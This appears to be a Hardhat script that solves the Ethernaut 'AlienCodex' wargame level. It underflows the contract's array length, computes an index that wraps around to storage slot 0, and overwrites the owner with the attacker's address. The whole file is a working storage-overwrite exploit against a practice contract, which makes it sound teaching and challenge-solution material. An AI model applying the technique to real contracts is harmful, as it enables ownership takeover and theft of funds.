import { Signer } from 'ethers'
import { ethers } from 'hardhat'
import { AlienCodex } from '../typechain-types/AlienCodex'
import { loadOrCreateLevelInstance, submitLevelInstance } from './ethernaut'

const levelAddress = '0xda5b3Fb76C78b6EdEE6BE8F11a1c31EcfB02b272'

const main = async () => {
  const signer = (await ethers.getSigners())[0] as Signer

  const targetContract = (await loadOrCreateLevelInstance('AlienCodex', levelAddress, signer)) as AlienCodex

  // Trivial call
  await (await targetContract.make_contact()).wait()

  // Underflow array length
  await (await targetContract.retract()).wait()

  // Calculate position of first element
  const arrayStartPosition = ethers.BigNumber.from(ethers.utils.keccak256(ethers.utils.zeroPad('0x01', 32)))

  // Calculate how much to add to overflow and overwrite first storage slot (owner)
  const difference = ethers.constants.MaxUint256.sub(arrayStartPosition).add(1)

  // Overwrite owner slot
  const tx = await targetContract.revise(difference, ethers.utils.zeroPad(await signer.getAddress(), 32))
  console.log('tx hash', tx.hash)
  await tx.wait()

  await submitLevelInstance(targetContract.address, signer)
}

main()
  .then(() => process.exit())
  .catch(e => {
    console.error(e)
    process.exit(1)
  })
